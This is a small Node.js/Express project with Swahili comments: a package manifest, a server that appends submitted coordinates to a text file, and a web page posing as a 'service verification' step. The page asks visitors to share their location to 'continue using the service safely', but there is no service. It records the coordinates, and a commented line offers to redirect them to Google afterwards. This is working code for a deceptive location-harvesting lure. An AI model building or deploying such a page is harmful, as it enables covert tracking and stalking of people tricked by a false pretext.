{
  "name": "mfumo-wa-location",
  "version": "1.0.0",
  "description": "Mfumo wa kuhifadhi location za watumiaji kwa idhini yao",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  },
  "dependencies": {
    "express": "^4.19.2"
  }
}
const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Inasoma PORT inayotolewa na Render/Railway, isipopoitafuta inatumia port 3000
const PORT = process.env.PORT || 3000;

// Inaruhusu seva kusoma data za JSON zinazokuja kutoka kwenye kivinjari
app.use(express.json());

// Inaruhusu seva kusoma mafile ya kawaida kama HTML yaliyopo kwenye folda hili
app.use(express.static(__dirname));

// Sehemu ya kupokea na kuhifadhi data za Location
app.post('/api/save-location', (req, res) => {
    const { latitude, longitude, timestamp } = req.body;
    
    if (!latitude || !longitude) {
        return res.status(400).json({ status: "error", message: "Data hazijakamilika" });
    }

    // Kutengeneza ujumbe mzuri wa maandishi utakao hifadhiwa
    const logMessage = `[${new Date(timestamp).toLocaleString()}] - Latitude: ${latitude}, Longitude: ${longitude}\n`;

    // Kuhifadhi data kwenye file la locations.txt (Litazalishwa lenyewe seva ikianza kupokea data)
    fs.appendFile(path.join(__dirname, 'locations.txt'), logMessage, (err) => {
        if (err) {
            console.error("Imeshindwa kuhifadhi kwenye faili:", err);
            return res.status(500).json({ status: "error", message: "Hitilafu ya seva" });
        }
        console.log("Location mpya imehifadhiwa vizuri!");
        res.json({ status: "success", message: "Location imepokelewa vizuri." });
    });
});

// Kuanzisha Seva
app.listen(PORT, () => {
    console.log(`Seva inafanya kazi kwenye Port: ${PORT}`);
});
<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uthibitisho wa Huduma</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            padding: 50px 20px; 
            background-color: #f4f6f9; 
            margin: 0;
        }
        .card { 
            background: white; 
            padding: 40px 30px; 
            border-radius: 12px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
            display: inline-block; 
            max-width: 400px;
            width: 100%;
        }
        h2 { color: #333; margin-bottom: 10px; }
        p { color: #666; font-size: 15px; line-height: 1.5; }
        button { 
            background-color: #28a745; 
            color: white; 
            border: none; 
            padding: 14px 28px; 
            font-size: 16px; 
            font-weight: bold;
            border-radius: 6px; 
            cursor: pointer; 
            margin-top: 25px; 
            width: 100%;
            transition: background 0.2s;
        }
        button:hover { background-color: #218838; }
        #status { margin-top: 20px; font-weight: 500; font-size: 14px; color: #444; }
    </style>
</head>
<body>

<div class="card">
    <h2>Thibitisha Eneo Lako</h2>
    <p>Ili kuendelea kutumia huduma hii kwa usalama, tafadhali bofya kitufe hapo chini ili kuruhusu mfumo kutambua eneo lako.</p>
    
    <button onclick="ombaLocation()">Ruhusu na Endelea</button>
    <p id="status"></p>
</div>

<script>
function ombaLocation() {
    const statusText = document.getElementById("status");
    statusText.style.color = "#444";
    statusText.innerText = "Inatafuta eneo lako...";

    if (!navigator.geolocation) {
        statusText.style.color = "red";
        statusText.innerText = "Kivinjari chako hakisapoti huduma hii ya Geolocation.";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                timestamp: position.timestamp
            };

            // Kutuma data kwenda kwenye Seva yetu ya Node.js
            fetch('/api/save-location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(resData => {
                if(resData.status === "success") {
                    statusText.style.color = "green";
                    statusText.innerText = "Asante! Eneo lako limethibitishwa kwa usalama.";
                    
                    // UKITAKA: Baada ya kukubali unaweza kumpeleka kwenye tovuti nyingine (kama google) kwa kufungua mstari wa chini:
                    // window.location.href = "https://www.google.com";
                } else {
                    statusText.style.color = "red";
                    statusText.innerText = "Kuna tatizo lilitokea wakati wa kuhifadhi data.";
                }
            })
            .catch(err => {
                console.error(err);
                statusText.style.color = "red";
                statusText.innerText = "Imeshindwa kuwasiliana na seva.";
            });
        },
        (error) => {
            statusText.style.color = "red";
            if (error.code === error.PERMISSION_DENIED) {
                statusText.innerText = "Umekataa kutoa ruhusa ya eneo lako. Hatuwezi kuendelea.";
            } else {
                statusText.innerText = "Imeshindwa kupata eneo lako kwa sasa. Jaribu tena.";
            }
        }
    );
}
</script>

</body>
</html>
